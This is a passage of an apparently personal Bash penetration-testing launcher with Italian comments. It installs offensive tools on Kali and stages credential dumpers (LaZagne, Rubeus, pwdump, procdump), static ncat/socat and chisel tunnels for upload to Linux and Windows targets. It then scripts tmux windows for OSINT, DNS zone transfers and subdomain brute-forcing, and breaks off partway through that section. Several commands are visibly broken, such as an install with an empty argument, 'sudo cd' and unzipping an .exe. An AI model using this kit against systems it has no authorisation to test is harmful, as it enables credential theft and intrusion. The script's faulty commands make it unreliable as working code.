#!/bin/bash
# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
source "common"

open_terminal() {
    # Determina il terminale da utilizzare in base al sistema operativo
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --tab -e "$1"
    elif command -v konsole &>/dev/null; then
        konsole --new-tab -e "$1"
    elif command -v xterm &>/dev/null; then
        xterm -e "$1"
    elif command -v qterminal &>/dev/null; then
        qterminal -e "$1"
    else
        # Nessun terminale specifico trovato, apre una nuova finestra di terminale di default
        echo "No specific terminal found. Default terminal opening."
        x-terminal-emulator -e "$1"
    fi
}

while true
do
    echo ""
    echo ""    
    echo "Select actions on [$site]:"
    echo "1. Userful Tool: install usefull tools for penetration test."
    echo "2. Information Gathering: OSINT from web + active scan from cmd"
    echo "3. Information Gathering (WEB): Info from WEB, site structure, API, CMS, etc."
    echo "4. Service Information Gathering: nmap scan"    
    echo "5. Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc"
    echo "6. Service AuthN bypass: ssh, ftp, smtp,  etc (TBD)"
    echo "7. Service AuthN bypass (WEB): brute force, command injection"
    echo ""
    read -p "Enter the number of the desired action (0 to exit): " choice





    case $choice in
        0)
            echo "I'm exiting the tool"
            echo "See you next game..."
            echo ""
            break
            ;;
        1)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEAPONIZATION
######################
######################
# Parametri
folderLin="/opt/_lin"
folderWin="/opt/_win"

# Funzione per verificare se un programma è installato
is_installed() {
    local program="$1"
    if command -v "$program" &> /dev/null; then
	return 0 # Installato
    else
	return 1 # Non installato
    fi
}

    echo ""
    echo "1. Kali Linux: tools to install on kali linux to be more powerful."
    echo "2. target Linux: userful tool to upload to a target machine with linux OS type."
    echo "3. target Windows: userful tool to upload to a target machine with windows OS type."     
    echo "4. Return to main manu"    
    echo ""   
    read -p "Enter the number of the desired action (0 to return Main Menu): " instachoice
    case $instachoice in
        4)
        ;;
        1)
# ===
# === APPLICAZIONI DA INSTALLARE SU KALI
# ===

echo " ==="
echo " === Utilità da installare su Kali ==="
echo " ==="
# aggiornamento apt
sudo apt update


# webDataExtractor
program="webDataExtractor.py"
printf "\n===================================\n"
pathAppo="/opt/webDataExtractor/"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /opt
	sudo pip install beautifulsoup4
	sudo git clone https://github.com/dokDork/webDataExtractor.git
	cd /opt/webDataExtractor/
	chmod 755 webDataExtractor.py
fi

# username_anarchy
program="username-anarchy"
printf "\n===================================\n"
pathAppo="/opt/uername-anarchy"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /opt
	sudo git clone https://github.com/urbanadventurer/username-anarchy.git
	cd /opt/username-anarchy
	sudo chmod 755 username-anarchy
fi

# seclists
program="seclists"
printf "\n===================================\n"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /usr/share
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# impacket
printf "\n===================================\n"
program="python3-impacket"
pathAppo="/usr/share/doc/python3-impacket/examples"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
fi

# nishang
printf "\n===================================\n"
program="nishang"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# mingw-w64
printf "\n===================================\n"
program="mingw-w64"
if ! is_installed "i686-w64-mingw32-gcc"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# script nmap
printf "\n===================================\n"
program="nmap script (vulnscan, vulners)"
pathAppo="/usr/share/nmap/scripts/vulscan"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /usr/share/nmap/scripts/
	sudo git clone https://github.com/vulnersCom/nmap-vulners.git
	sudo git clone https://github.com/scipag/vulscan.git
	cd /usr/share/nmap/scripts/vulscan/
	chmod +x update.sh
	sudo ./update.sh
fi

#Nessus
printf "\n===================================\n"
program="nessus"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.6.3-ubuntu1404_amd64.deb' --output 'Nessus-10.6.3-ubuntu1404_amd64.deb'
	sudo dpkg -i Nessus-10.6.3-ubuntu1404_amd64.deb
fi

# kitrunner (analisi API)
printf "\n===================================\n"
program="kr"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_386.tar.gz
	sudo gunzip kiterunner_1.0.2_linux_386.tar.gz
	sudo tar -xvf kiterunner_1.0.2_linux_386.tar 
	sudo chmod 755 ./kr
fi


# uniscan (automatizzo il command injection)
printf "\n===================================\n"
program="uniscan"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install uniscan
fi

# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
printf "\n===================================\n"
program="joomscan"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install joomscan
fi

# droopescan (automatizzo l'analisi delle vulnerabilità di drupal)
printf "\n===================================\n"
program="droopescan"
cd /opt
if is_installed "droopescan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install droopescan 
fi


# wisker / cupp (automatizzo la creazione di un dizionario)
printf "\n===================================\n"
program="wisker"
if is_installed "wisker"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install wisker 
fi

printf "\n===================================\n"
program="cupp"
if is_installed "cupp"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install cupp
fi


# cmsmap (bruteforce su Joomla, WOrdpress e Drupal)
printf "\n===================================\n"
program="cmsmap"
cd /opt
if is_installed "cmsmap"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo  git clone https://github.com/Dionach/CMSmap
	cd /opt/CMSmap 
	sudo pip3 install .
fi

# dirsearch (search directory)
printf "\n===================================\n"
program="dirsearch"
cd /opt
if is_installed "dirsearch"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install dirsearch
fi


# whatwaf (WAF detection)
printf "\n===================================\n"
program="whatweb"
cd /opt
if is_installed "whatweb"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install whatweb
fi

# fromWord2Site
printf "\n===================================\n"
program="fromWord2Site"
cd /opt
if is_installed "fromWord2Site"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo git clone https://github.com/dokDork/fromWord2Site.git
	cd /opt/fromWord2Site
	sudo chmod 755 fromWOrd2Site.py
fi

# identYwaf
printf "\n===================================\n"
program="identYwaf"
cd /opt
if is_installed "identYwaf"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo git clone --depth 1 https://github.com/stamparm/identYwaf.git
	cd /opt/identYwaf
	sudo chmod 755 identYwaf.py
fi

# Synk e copilot
printf "\n===================================\n"
echo "[A] Synk e Copilot can not be installed automatically."
echo "    Please refer to:"
echo "    https://github.com/IppSec/parrot-build"


# Docker
printf "\n===================================\n"
program="Docker"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo sudo apt install docker.io -y
fi


# hakluke/hakrawler
printf "\n===================================\n"
program="hakluke/hakrawler"
cd /opt
if [ -d "/opt/hakrawler" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/hakrawler
	cd /opt/hakrawler
	sudo git clone https://github.com/hakluke/hakrawler
	cd hakrawler
	sudo docker build -t hakluke/hakrawler .
fi


# sxcurity/gau
printf "\n===================================\n"
program="sxcurity/gau"
cd /opt
if [ -d "/opt/gau" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/gau
	cd /opt/gau
        sudo docker run --rm sxcurity/gau:latest –help
fi


# sublist3r (OSINT: subdomain)
printf "\n===================================\n"
program="sublist3r"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install sublist3r
fi


# crtsh (OSINT: subdomain)
printf "\n===================================\n"
program="crtsh"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo touch /usr/bin/crtsh
	sudo chmod 777 /usr/bin/crtsh
	sudo echo 'curl -s https://crt.sh/\?cn\=%.$1\&output=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u' > /usr/bin/crtsh
	sudo chmod 755 /usr/bin/crtsh
fi


# subfinder (OSINT: subdomain)
printf "\n===================================\n"
program="subfinder"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install gccgo-go 
	sudo apt install golang-go
	go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
	sudo apt install subfinder
fi


# spiderfoot (OSINT: info)
printf "\n===================================\n"
program="spiderfoot"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install spiderfoot
fi


# metagoofil (OSINT: meta info)
printf "\n===================================\n"
program="metagoofil"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install metagoofil
fi


# ZAP (vulnerability assessment)
printf "\n===================================\n"
program="zap"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/zap &&sudo wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh -O /opt/zap/zap.sh && sudo chmod +x /opt/zap/zap.sh
fi


# crackmapexec
printf "\n===================================\n"
program="crackmapexec"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt-get install crackmapexec
fi


# impacket
printf "\n===================================\n"
program="impacket"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt-get install python3-impacket
fi

# git-dumper
printf "\n===================================\n"
program="git-dumper"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install python3 python3-pip
	sudo apt install python3.13-venv
	python3 -m venv git_stuff
	source git_stuff/bin/activate
	pip install git-dumper
fi

# gitleaks
printf "\n===================================\n"
program="gitleaks"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install gitleaks
fi

# kerbrute 
printf "\n===================================\n"
program="kerbrute"
if is_installed "/home/kali/.local/bin/kerbrute "; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install pipx
	pipx install kerbrute
	pipx ensurepath 
fi

# trufflehog 
printf "\n===================================\n"
program="trufflehog"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install trufflehog
fi

# gxfr (DNS tool)
printf "\n===================================\n"
program="gxfr"
cd /opt
if [ -d "/opt/gxfr" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/gxfr
	cd /opt/gxfr
	sudo wget https://raw.githubusercontent.com/leonteale/pentestpackage/master/gxfr.py
fi

# SNMP (Enyx)
printf "\n===================================\n"
program="enyx"
cd /opt
if [ -d "/opt/enyx" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/enyx
	cd /opt/enyx
	sudo git clone https://github.com/trickster0/Enyx.git
fi

# SNMP (snmp-mibs-downloader)
printf "\n===================================\n"
program="snmp-mibs-downloader"
cd /opt
if dpkg -l | grep -q snmp-mibs-downloader; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install -y snmp-mibs-downloader
	# Uncomment the 'mibs' line in snmp.conf
	if grep -q '^#mibs:' /etc/snmp/snmp.conf; then
	  echo "Uncommenting the 'mibs' line in /etc/snmp/snmp.conf"
	  sudo sed -i 's/^#mibs:/mibs:/' /etc/snmp/snmp.conf
	else
	  echo "The line '#mibs:' was not found in /etc/snmp/snmp.conf"
	  echo "Checking if the 'mibs:' line exists with a different comment character."
	    if grep -q '^; *mibs' /etc/snmp/snmp.conf; then
	      echo "Uncommenting the 'mibs' line in /etc/snmp/snmp.conf using the ';' symbol."
	      sudo sed -i 's/^; *mibs/mibs/' /etc/snmp/snmp.conf
	    else
	      echo "Adding the 'mibs:' line to the end of the /etc/snmp/snmp.conf file"
	      sudo echo "mibs:" >> /etc/snmp/snmp.conf
	    fi
	fi
fi

# SNMP (snmpwalk) 
printf "\n===================================\n"
program="snmpwalk"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git snmpwalk
fi

# SNMP (snmpenum) 
printf "\n===================================\n"
program="snmpenum"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git snmpenum
	sudo mkdir /opt/snmpenum
	cd /opt/snmpenum/
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/linux.txt
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/cisco.txt
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/windows.txt
fi

# finger-user-enum (finger enumeration)
printf "\n===================================\n"
program="finger-user-enum"
cd /opt
if [ -d "/opt/finger-user-enum" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo mkdir finger-user-enum
	cd finger-user-enum
	sudo git clone https://github.com/pentestmonkey/finger-user-enum
	cd finger-user-enum
	sudo chmod 755 finger-user-enum.pl
fi

# thc-hydra
printf "\n===================================\n"
program="thc-hydra"
cd /opt
if [ -d "/opt/thc-hydra" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
	sudo cd thc-hydra
	sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk 2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev libmemcached-dev libgpg-error-dev libgcrypt11-dev libgcrypt20-dev
	sudo apt install libsmbclient-dev
	cd /opt/thc-hydra/
	sudo ./configure
	sudo make
	sudo make install
fi

# SVN TOOLs 
printf "\n===================================\n"
program="svn"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git git-svn subversion
fi







        ;;
        2)
# ===
# === APPLICAZIONI PER TARGET LINUX
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Linux ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderLin" ]; then
    sudo mkdir -p "$folderLin"
    echo "[i] Cartella $folderLin creata con successo"
else
    echo "[i] La cartella $folderLin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderLin
# Crea il file download.txt con 10 URL
sudo touch download.txt
echo "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nping" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" | sudo tee -a download.txt
echo "https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_386.gz" | sudo tee -a download.txt
echo "https://github.com/hugsy/gdb-static/raw/master/gdb-7.10.1-x32" | sudo tee -a download.txt

# Scarica i file utilizzando wget
printf "\n===================================\n"
echo "[i] Interesting Application download"
sudo wget -N -i download.txt

#completo l'installazione di chisel
printf "\n===================================\n"
echo "[i] chisel installation"
sudo gunzip chisel_1.7.4_linux_386.gz 
sudo mv chisel_1.7.4_linux_386 chisel 
sudo chmod 755 *
sudo upx brute chisel










            ;;
        3)
# ===
# === APPLICAZIONI PER TARGET WINDOWS
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Windows ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderWin" ]; then
    sudo mkdir -p "$folderWin"
    echo "[i] Cartella $folderWin creata con successo"
else
    echo "[i] La cartella $folderWin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderWin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEAS.bat
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx86.exe
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nmap.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nping.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_windows_386.gz
EOF
# Scarica i file utilizzando wget
printf "\n===================================\n"
echo "[i] Interesting Application Download"
wget -N -i download.txt

#completo l'installazione di chisel
printf "\n===================================\n"
echo "[i] chisel installation"
sudo gunzip chisel_1.7.4_windows_386.gz 
sudo mv chisel_1.7.4_windows_386 chisel.exe 
sudo upx brute chisel.exe

# SharpCollection
printf "\n===================================\n"
echo "[i] sharpCollection installation"
sudo git clone https://github.com/Flangvik/SharpCollection.git

# samdump, pwdump, procdump
#SAMDUMP2
printf "\n===================================\n"
echo "[i] samdump2 installation"
sudo apt install samdump2
# PWDUMP
printf "\n===================================\n"
echo "[i] Pwdump installation"
sudo wget -N https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
sudo unzip -o pwdump8-8.2.zip
sudo chmod 755 ./pwdump8
sudo chmod 755 ./pwdump8/*
# PROCDUMP
printf "\n===================================\n"
echo "[i] ProcDump installation"
sudo wget -N https://download.sysinternals.com/files/Procdump.zip
sudo unzip -o Procdump.zip
sudo chmod 755 *
# Rubeus.exe
printf "\n===================================\n"
echo "[i] ProcDump installation"
sudo wget -N https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe
sudo unzip -o Rubeus.exe
sudo chmod 755 *


;;
esac
;;            
            
            
            
            

        2)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Information Gathering: OSINT from web, active scan from cmd"
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter


# INFORMATION GATHERING
cd $folderProjectInfoGathering
# OSINT multifunctional websites
# Layout
tmux new-window -t PT:1 -n 'OSINT: multifunctional websites'
tmux split-window -v -t PT:1.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# OSINT: multifunctional websites" Enter
tmux send-keys -t PT:1.0 "grep -v '^#' $folderProjectEngine/osint-web-multifunzione.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT subdomain searcher
# Layout
tmux new-window -t PT:2 -n 'OSINT: subdomain searcher'
tmux split-window -v -t PT:2.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# OSINT: subdomain searcher" Enter
tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/osint-web-subdomain.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: IP Neighbour searcher
# Layout
tmux new-window -t PT:3 -n 'OSINT: IP Neighbour searcher'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# OSINT: IP Neighbour searcher" Enter
tmux send-keys -t PT:3.0 "grep -v '^#' $folderProjectEngine/osint-web-ip.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: site Technology
# Layout
tmux new-window -t PT:4 -n 'OSINT: site Technology'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# OSINT: site Technology" Enter
tmux send-keys -t PT:4.0 "grep -v '^#' $folderProjectEngine/osint-web-site.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: DNS data exfiltration
# Layout
tmux new-window -t PT:5 -n 'OSINT: DNS data exfiltration'
tmux split-window -v -t PT:5.0
tmux select-pane -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -v -t PT:5.5
tmux select-pane -t "5.5"
tmux split-window -h -t "5.5"
tmux split-window -v -t PT:5.7
tmux select-pane -t "5.7"
tmux split-window -h -t "5.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with webSite" Enter
tmux send-keys -t PT:5.0 "grep -v '^#' $folderProjectEngine/osint-web-dns.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:5.1 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with dnsrecon" Enter
tmux send-keys -t PT:5.1 "dnsrecon -d $domain"
tmux send-keys -t PT:5.2 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with host" Enter
tmux send-keys -t PT:5.2 "host -t a $site && host -t aaaa $site && host -t mx $site && host -t ns $site && host -t ptr $ip"
tmux send-keys -t PT:5.3 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with nslookup" Enter
tmux send-keys -t PT:5.3 "nslookup $site && nslookup $ip"
tmux send-keys -t PT:5.4 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with dnsenum" Enter
tmux send-keys -t PT:5.4 "dnsenum $domain"
tmux send-keys -t PT:5.5 "# OSINT: DNS Zone Transfer with dig" Enter
tmux send-keys -t PT:5.5 "dig axfr $domain"
tmux send-keys -t PT:5.6 "# OSINT: DNS Zone Transfer with dnsrecon" Enter
tmux send-keys -t PT:5.6 "dnsrecon -t axfr -n $ip -d $domain"
tmux send-keys -t PT:5.7 "# OSINT: DNS SubDomain research" Enter
tmux send-keys -t PT:5.7 "python2 /opt/gxfr/gxfr.py --gxfr --dns-lookup"
tmux send-keys -t PT:5.8 "# OSINT: DNS SubDomain research" Enter
tmux send-keys -t PT:5.8 "dnsrecon -t brt -D /usr/share/dnsrecon/namelist.txt -d $domain"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: WHOIS data exfiltration
# Layout
tmux new-window -t PT:6 -n 'OSINT: WHOIS data exfiltration'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# OSINT: WHOIS data exfiltration" Enter
tmux send-keys -t PT:6.0 "grep -v '^#' $folderProjectEngine/osint-web-whois.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:6.1 "# OSINT: WHOIS qury with whois" Enter
tmux send-keys -t PT:6.1 "whois $domain && whois $ip"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: port scanning (online)
# Layout
tmux new-window -t PT:7 -n 'OSINT: port scanning (online)'
tmux split-window -v -t PT:7.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# OSINT: port scanning (online)" Enter
tmux send-keys -t PT:7.0 "grep -v '^#' $folderProjectEngine/osint-web-port.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: anonymous search engines
# Layout
tmux new-window -t PT:8 -n 'OSINT: anonymous search engines'
tmux split-window -v -t PT:8.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# OSINT: anonymous search engines" Enter
tmux send-keys -t PT:8.0 "grep -v '^#' $folderProjectEngine/osint-web-engine.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: search engines for companies or people
# Layout
tmux new-window -t PT:9 -n 'OSINT: search engines for companies or people'
tmux split-window -v -t PT:9.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# OSINT: search engines for companies or people" Enter
tmux send-keys -t PT:9.0 "grep -v '^#' $folderProjectEngine/osint-web-company.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: web reputation
# Layout
tmux new-window -t PT:10 -n 'OSINT: web reputation'
tmux split-window -v -t PT:10.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:10.0 "# OSINT: web reputation" Enter
tmux send-keys -t PT:10.0 "grep -v '^#' $folderProjectEngine/osint-web-reputation.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: wayback machine
# Layout
tmux new-window -t PT:11 -n 'OSINT: wayback machine'
tmux split-window -v -t PT:11.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# OSINT: wayback machine" Enter
tmux send-keys -t PT:11.0 "grep -v '^#' $folderProjectEngine/osint-web-wayback.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: shodan - censis
# Layout
tmux new-window -t PT:12 -n 'OSINT: shodan - censis'
tmux split-window -v -t PT:12.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# OSINT: shodan - censis" Enter
tmux send-keys -t PT:12.0 "grep -v '^#' $folderProjectEngine/osint-web-shodan.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: other sites
# Layout
tmux new-window -t PT:13 -n 'OSINT: other sites'
tmux split-window -v -t PT:13.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# OSINT: other sites" Enter
tmux send-keys -t PT:13.0 "grep -v '^#' $folderProjectEngine/osint-web-other.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# Active scan: subdomain
# Layout
tmux new-window -t PT:14 -n 'Active scan: subdomain'
tmux split-window -v -t PT:14.0
tmux select-pane -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -v -t PT:14.4
tmux select-pane -t "14.4"
tmux split-window -h -t "14.4"
tmux split-window -v -t PT:14.6
tmux select-pane -t "14.6"
tmux split-window -h -t "14.6"
tmux split-window -h -t "14.6"
tmux split-window -h -t "14.6"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# Active scan: subdomain with subfinder" Enter
tmux send-keys -t PT:14.0 "subfinder -d $domain -all"
tmux send-keys -t PT:14.1 "# Active scan: subdomain with sublist3r" Enter
tmux send-keys -t PT:14.1 "sublist3r -d $domain"
tmux send-keys -t PT:14.2 "# Active scan: subdomain with crtsh" Enter
tmux send-keys -t PT:14.2 "crtsh $domain"
tmux send-keys -t PT:14.3 "# find domain from crtsh sbdomain list" Enter
tmux send-keys -t PT:14.3 "cat crtsh-domain-list.txt | rev | cut -d "." -f 1,2 | rev | sort -u"
tmux send-keys -t PT:14.4 "# Active scan: create dictionary with cewl" Enter
tmux send-keys -t PT:14.4 "cewl $url -d 3 -m 5 -w cewl-subdomain.txt --with-numbers"
tmux send-keys -t PT:14.5 "# Active scan: find a valid dictionary with seclists" Enter
tmux send-keys -t PT:14.5 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:14.6 "# Active scan: subdomain with gobuster" Enter
tmux send-keys -t PT:14.6 "gobuster vhost -u $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain"
tmux send-keys -t PT:14.7 "# Active scan: subdomain with wfuzz" Enter
tmux send-keys -t PT:14.7 "wfuzz -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 178"
tmux send-keys -t PT:14.8 "# Active scan: subdomain with ffuf" Enter
